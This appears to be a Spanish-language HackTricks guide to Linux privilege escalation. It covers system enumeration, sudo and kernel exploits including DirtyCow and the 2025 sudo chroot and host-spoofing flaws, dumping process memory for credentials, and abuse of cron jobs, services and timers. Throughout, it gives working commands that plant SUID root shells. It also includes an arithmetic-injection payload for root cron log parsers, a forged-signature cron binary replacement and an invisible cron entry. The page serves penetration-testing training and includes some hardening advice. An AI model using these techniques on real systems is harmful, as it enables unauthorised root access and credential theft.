# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Información del sistema

### Información del SO

Empecemos obteniendo algo de conocimiento sobre el SO en ejecución
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ruta

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`** es posible que puedas secuestrar algunas bibliotecas o binarios:
```bash
echo $PATH
```
### Información del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Exploits del kernel

Comprueba la versión del kernel y si existe algún exploit que se pueda usar para escalar privilegios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernel vulnerables y algunos **compiled exploits** ya **compiled** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Otros sitios donde puedes encontrar algunos **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones de kernel vulnerables de esa web puedes hacer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Las herramientas que podrían ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima, solo comprueba exploits para kernel 2.x)

Siempre **busca la versión del kernel en Google**, quizá tu versión del kernel esté escrita en algún kernel exploit y entonces estarás seguro de que ese exploit es válido.

Técnicas adicionales de explotación del kernel:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalada de Privilegios en Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versión de Sudo

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes comprobar si la versión de sudo es vulnerable usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Las versiones de Sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permiten a usuarios locales sin privilegios escalar sus privilegios a root mediante la opción `--chroot` de sudo cuando el archivo `/etc/nsswitch.conf` se usa desde un directorio controlado por el usuario.

Aquí hay un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerabilidad](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y de que soporte la función `chroot`.

Para más información, consulta el [aviso de vulnerabilidad](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) original

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo antes de 1.9.17p1 (rango afectado informado: **1.8.8–1.9.17**) puede evaluar reglas de sudoers basadas en host usando el **nombre de host proporcionado por el usuario** desde `sudo -h <host>` en lugar del **nombre de host real**. Si sudoers concede privilegios más amplios en otro host, puedes **suplantar** ese host localmente.

Requisitos:
- Versión vulnerable de sudo
- Reglas de sudoers específicas de host (el host no es ni el nombre de host actual ni `ALL`)

Ejemplo de patrón sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploitando mediante suplantación del host permitido:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Si la resolución del nombre suplantado se bloquea, añádelo a `/etc/hosts` o usa un hostname que ya aparezca en logs/configs para evitar búsquedas DNS.

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### La verificación de la firma de dmesg falló

Consulta la **box smasher2 de HTB** para un **ejemplo** de cómo esta vuln podría ser explotada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si estás dentro de un container, empieza con la siguiente sección de container-security y luego pivota a las páginas de abuse específicas del runtime:


{{#ref}}
container-security/
{{#endref}}

## Drives

Comprueba **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, puedes intentar montarlo y buscar información privada
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumera binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
También, comprueba si **hay algún compilador instalado**. Esto es útil si necesitas usar algún kernel exploit, ya que se recomienda compilarlo en la máquina donde lo vas a usar (o en una similar)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Tal vez haya alguna versión antigua de Nagios (por ejemplo) que pueda ser explotada para escalar privilegios…\
Se recomienda comprobar manualmente la versión del software instalado que resulte más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software desactualizado y vulnerable instalado dentro de la máquina.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil, por lo tanto se recomienda usar aplicaciones como OpenVAS o similares que comprobarán si alguna versión de software instalada es vulnerable a exploits conocidos_

## Processes

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si algún proceso tiene **más privilegios de los que debería** (¿quizá un tomcat ejecutándose como root?)
```bash
ps aux
ps -ef
top -n 1
```
Siempre comprueba si hay posibles [**electron/cef/chromium debuggers** en ejecución, podrías abusar de ello para escalar privilegios](electron-cef-chromium-debugger-abuse.md). **Linpeas** los detecta comprobando el parámetro `--inspect` dentro de la línea de comandos del proceso.\
También **comprueba tus privilegios sobre los binarios de los procesos**, quizá puedas sobrescribir el de alguien.

### Cross-user parent-child chains

Un proceso hijo que se ejecuta bajo un **usuario diferente** al de su padre no es automáticamente malicioso, pero es una señal útil de **triaje**. Algunas transiciones son esperadas (`root` iniciando un usuario de servicio, gestores de inicio de sesión creando procesos de sesión), pero cadenas inusuales pueden revelar wrappers, debug helpers, persistencia o límites de confianza débiles en tiempo de ejecución.

Revisión rápida:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Si encuentras una cadena sorprendente, inspecciona la línea de comandos del proceso padre y todos los archivos que influyen en su comportamiento (`config`, `EnvironmentFile`, scripts auxiliares, directorio de trabajo, argumentos escribibles). En varias rutas reales de privesc el hijo en sí no era escribible, pero la **config controlada por el padre** o la cadena de helpers sí lo era.

### Ejecutables eliminados y archivos abiertos eliminados

Los artefactos en tiempo de ejecución a menudo siguen siendo accesibles **después de su eliminación**. Esto es útil tanto para privilege escalation como para recuperar evidencia de un proceso que ya tiene archivos sensibles abiertos.

Comprueba los ejecutables eliminados:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando la antigua imagen binaria desde memoria. Eso es una señal fuerte para investigar porque:

- el ejecutable eliminado puede contener cadenas o credenciales interesantes
- el proceso en ejecución puede seguir exponiendo descriptores de archivo útiles
- un binario privilegiado eliminado puede indicar manipulación reciente o un intento de limpieza

Recopila globalmente los archivos abiertos y eliminados:
```bash
lsof +L1
```
Si encuentras un descriptor interesante, recupéralo directamente:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Esto es especialmente valioso cuando un proceso todavía tiene abierto un secret, script, database export o flag file eliminados.

### Process monitoring

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen un conjunto de requisitos.

### Process memory

Algunos servicios de un servidor guardan **credentials en texto claro dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo tanto esto suele ser más útil cuando ya eres root y quieres descubrir más credentials.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que te pertenecen**.

> [!WARNING]
> Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace por defecto**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos los procesos pueden depurarse, siempre que tengan el mismo uid. Esta es la forma clásica en que funcionaba ptracing.
> - **kernel.yama.ptrace_scope = 1**: solo se puede depurar un proceso padre.
> - **kernel.yama.ptrace_scope = 2**: solo el admin puede usar ptrace, ya que requiere la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: no se puede rastrear ningún proceso con ptrace. Una vez configurado, se necesita reiniciar para habilitar ptracing de nuevo.

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo), podrías obtener el Heap y buscar dentro sus credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script de GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps muestra cómo la memoria está mapeada dentro del** espacio de direcciones virtuales de ese proceso; también muestra los **permisos de cada región mapeada**. El pseudo archivo **mem** **expone la propia memoria del proceso**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus offsets. Usamos esta información para **hacer seek dentro del archivo mem y volcar todas las regiones legibles** a un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. El espacio de direcciones virtuales del kernel se puede acceder usando /dev/kmem.\
Normalmente, `/dev/mem` solo es legible por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump es una reimaginación para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Consíguela en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Para volcar la memoria de un proceso puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso del que eres propietario
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credentials from Process Memory

#### Manual example

Si encuentras que el proceso authenticator se está ejecutando:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes dumpear el proceso (consulta las secciones anteriores para encontrar diferentes formas de dumpear la memoria de un proceso) y buscar credenciales dentro de la memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos bien conocidos**. Requiere privilegios de root para funcionar correctamente.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) ejecutándose como root – privesc de programador web

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y solo está vinculado a loopback, aún puedes acceder a él mediante SSH local port-forwarding y crear un job privilegiado para escalar.

Cadena típica
- Descubre el puerto solo de loopback (p. ej., 127.0.0.1:8000) y el realm de Basic-Auth mediante `ss -ntlp` / `curl -v localhost:8000`
- Encuentra credenciales en artefactos operativos:
- Backups/scripts con `zip -P <password>`
- unidad systemd que expone `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crear un job de alta privilegio y ejecutarlo inmediatamente (droppea un shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- No ejecutes Crontab UI como root; restríngelo con un usuario dedicado y permisos mínimos
- Enlaza a localhost y, además, restringe el acceso mediante firewall/VPN; no reutilices contraseñas
- Evita incrustar secretos en archivos de unidad; usa secret stores o un EnvironmentFile solo para root
- Habilita audit/logging para ejecuciones de jobs bajo demanda



Comprueba si algún scheduled job es vulnerable. Tal vez puedas aprovechar que root ejecuta un script (¿vuln de wildcard? ¿puedes modificar archivos que root usa? ¿usar symlinks? ¿crear archivos específicos en el directorio que usa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Si se usa `run-parts`, comprueba qué nombres se ejecutarán realmente:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Esto evita falsos positivos. Un directorio periódico escribible solo es útil si el nombre de tu payload coincide con las reglas locales de `run-parts`.

### Cron path

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota cómo el usuario "user" tiene privilegios de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell de root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un wildcard (Wildcard Injection)

Si un script ejecutado por root tiene un “**\***” dentro de un comando, podrías aprovecharlo para hacer cosas inesperadas (como privesc). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el wildcard va precedido de una ruta como** _**/some/path/\***_ **, no es vulnerable (incluso** _**./\***_ **tampoco lo es).**

Lee la siguiente página para más trucos de explotación de wildcards:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection en cron log parsers

Bash realiza parameter expansion y command substitution antes de la evaluación aritmética en ((...)), $((...)) y let. Si un root cron/parser lee campos de log no confiables y los pasa a un contexto aritmético, un atacante puede inyectar una command substitution $(...) que se ejecuta como root cuando se ejecuta el cron.

- Por qué funciona: En Bash, las expansiones ocurren en este orden: parameter/variable expansion, command substitution, arithmetic expansion, luego word splitting y pathname expansion. Así, un valor como `$(/bin/bash -c 'id > /tmp/pwn')0` se sustituye primero (ejecutando el comando), y luego el `0` numérico restante se usa para la aritmética, por lo que el script continúa sin errores.

- Patrón vulnerable típico:
```bash
#!/bin/bash
# Ejemplo: parsear un log y "sumar" un campo de conteo que proviene del log
while IFS=',' read -r ts user count rest; do
# count no es confiable si el log está controlado por el atacante
(( total += count ))     # o: let "n=$count"
done < /var/www/app/log/application.log
```

- Explotación: Haz que se escriba texto controlado por el atacante en el log analizado para que el campo con aspecto numérico contenga una command substitution y termine con un dígito. Asegúrate de que tu comando no imprima en stdout (o redirígelo) para que la aritmética siga siendo válida.
```bash
# Valor de campo inyectado dentro del log (por ejemplo, mediante una HTTP request forjada que la app registra literalmente):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# Cuando el root cron parser evalúa (( total += count )), tu comando se ejecuta como root.
```

### Cron script overwriting and symlink

Si **puedes modificar un cron script** ejecutado por root, puedes obtener una shell muy fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root usa un **directorio al que tienes acceso total**, quizá sea útil borrar esa carpeta y **crear una carpeta symlink hacia otra** que sirva un script controlado por ti
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validación de symlink y manejo de archivos más seguro

Al revisar scripts/binarios privilegiados que leen o escriben archivos por ruta, verifica cómo se manejan los links:

- `stat()` sigue un symlink y devuelve metadatos del objetivo.
- `lstat()` devuelve metadatos del link en sí.
- `readlink -f` y `namei -l` ayudan a resolver el objetivo final y muestran los permisos de cada componente de la ruta.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Para defenders/developers, patrones más seguros contra trucos de symlink incluyen:

- `O_EXCL` con `O_CREAT`: falla si la ruta ya existe (bloquea enlaces/archivos pre-creados por el atacante).
- `openat()`: operar de forma relativa a un descriptor de archivo de un directorio de confianza.
- `mkstemp()`: crear archivos temporales de forma atómica con permisos seguros.

### Custom-signed cron binaries with writable payloads
Blue teams a veces "sign" cron-driven binaries volcando una sección ELF custom y haciendo grep de una vendor string antes de ejecutarlos como root. Si ese binary es group-writable (por ejemplo, `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) y puedes leak el material de signing, puedes forjar la sección y hijack the cron task:

1. Usa `pspy` para capturar el flujo de verificación. En Era, root ejecutó `objcopy --dump-section .text_sig=text_sig_section.bin monitor` seguido de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` y luego ejecutó el archivo.
2. Recrea el certificate esperado usando la key/config filtrada (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construye un replacement malicioso (por ejemplo, drop a SUID bash, add your SSH key) y embed el certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sobrescribe el binary programado preservando los bits de ejecución:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Espera a la siguiente ejecución de cron; una vez que el naive signature check tenga éxito, tu payload se ejecuta como root.

### Frequent cron jobs

Puedes monitorizar los procesos para buscar procesos que se ejecutan cada 1, 2 o 5 minutos. Quizá puedas aprovecharlo y escalar privilegios.

Por ejemplo, para **monitorizar cada 0.1s durante 1 minuto**, **ordenar por menos comandos ejecutados** y borrar los comandos que se han ejecutado más, puedes hacer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitoreará y listará cada proceso que se inicie).

### Copias de seguridad de root que conservan los mode bits establecidos por el atacante (pg_basebackup)

Si un cron propiedad de root envuelve `pg_basebackup` (o cualquier copia recursiva) contra un directorio de base de datos en el que puedas escribir, puedes plantar un **binario SUID/SGID** que será copiado de nuevo como **root:root** con los mismos mode bits en la salida de la copia de seguridad.

Flujo típico de descubrimiento (como usuario de DB con pocos privilegios):
- Usa `pspy` para detectar un cron de root que llame algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` cada minuto.
- Confirma que el cluster de origen (por ejemplo, `/var/lib/postgresql/14/main`) es escribible por ti y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después del trabajo.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Esto funciona porque `pg_basebackup` preserva los bits de modo del archivo al copiar el clúster; cuando se invoca por root, los archivos de destino heredan **propiedad de root + SUID/SGID elegido por el atacante**. Cualquier rutina de backup/copia privilegiada similar que conserve permisos y escriba en una ubicación ejecutable es vulnerable.

### Tareas cron invisibles

Es posible crear un cronjob **poniendo un retorno de carro después de un comentario** (sin carácter de nueva línea), y el cronjob funcionará. Ejemplo (nótese el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Para detectar este tipo de entrada furtiva, inspecciona los archivos cron con herramientas que expongan caracteres de control:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Comprueba si puedes escribir cualquier archivo `.service`; si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, **reinicie** o **se detenga** (quizá tengas que esperar hasta que la máquina se reinicie).\
Por ejemplo, crea tu backdoor dentro del archivo `.service` con **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Ten en cuenta que si tienes **permisos de escritura sobre binarios ejecutados por services**, puedes cambiarlos por backdoors para que, cuando los services se vuelvan a ejecutar, se ejecuten las backdoors.

### systemd PATH - Relative Paths

Puedes ver el PATH usado por **systemd** con:
```bash
systemctl show-environment
```
Si encuentras que puedes **write** en cualquiera de las carpetas de la ruta, puede que puedas **escalate privileges**. Debes buscar **relative paths being used on service configurations** en archivos como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Entonces, crea un **ejecutable** con el **mismo nombre que el binario de la ruta relativa** dentro de la carpeta PATH de systemd en la que puedas escribir, y cuando el servicio sea solicitado para ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), tu **backdoor se ejecutará** (los usuarios sin privilegios normalmente no pueden iniciar/detener servicios, pero comprueba si puedes usar `sudo -l`).

**Aprende más sobre services con `man systemd.service`.**

## **Timers**

Los **Timers** son archivos unit de systemd cuyo nombre termina en `**.timer**` que controlan archivos `**.service**` o eventos. Los **Timers** se pueden usar como alternativa a cron, ya que tienen soporte integrado para eventos de tiempo de calendario y eventos de tiempo monótono, y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los timers con:
```bash
systemctl list-timers --all
```
### Temporizadores escribibles

Si puedes modificar un temporizador, puedes hacer que ejecute algunas instancias de systemd.unit (como una `.service` o una `.target`)
```bash
Unit=backdoor.service
```
En la documentación puedes leer qué es la Unit:

> La unidad que se activará cuando este timer expire. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor usa por defecto un service que tiene el mismo nombre que la unidad timer, excepto por el sufijo. (Ver arriba.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del timer sean idénticos, excepto por el sufijo.

Por lo tanto, para abusar de este permiso necesitarías:

- Encontrar alguna unidad systemd (como una `.service`) que esté **ejecutando un binary escribible**
- Encontrar alguna unidad systemd que esté **ejecutando una ruta relativa** y que tengas **privilegios de escritura** sobre el **systemd PATH** (para suplantar ese ejecutable)

**Aprende más sobre timers con `man systemd.timer`.**

### **Activando Timer**

Para activar un timer necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note que el **timer** se **activa** creando un symlink a él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma o en diferentes máquinas dentro de modelos cliente-servidor. Utilizan archivos estándar de descriptor Unix para la comunicación entre equipos y se configuran mediante archivos `.socket`.

Los Sockets pueden configurarse usando archivos `.socket`.

**Aprende más sobre sockets con `man systemd.socket`.** Dentro de este archivo, se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero se usa un resumen para **indicar dónde va a escuchar** el socket (la ruta del archivo socket AF_UNIX, la IPv4/6 y/o el número de puerto en el que escuchar, etc.)
- `Accept`: Toma un argumento booleano. Si es **true**, se crea una **instancia de servicio para cada conexión entrante** y solo se le pasa el socket de conexión. Si es **false**, todos los sockets de escucha se **pasan a la unidad de servicio iniciada**, y solo se crea una unidad de servicio para todas las conexiones. Este valor se ignora para sockets datagram y FIFOs, donde una única unidad de servicio maneja incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por razones de rendimiento, se recomienda escribir nuevos daemons solo de una forma adecuada para `Accept=no`.
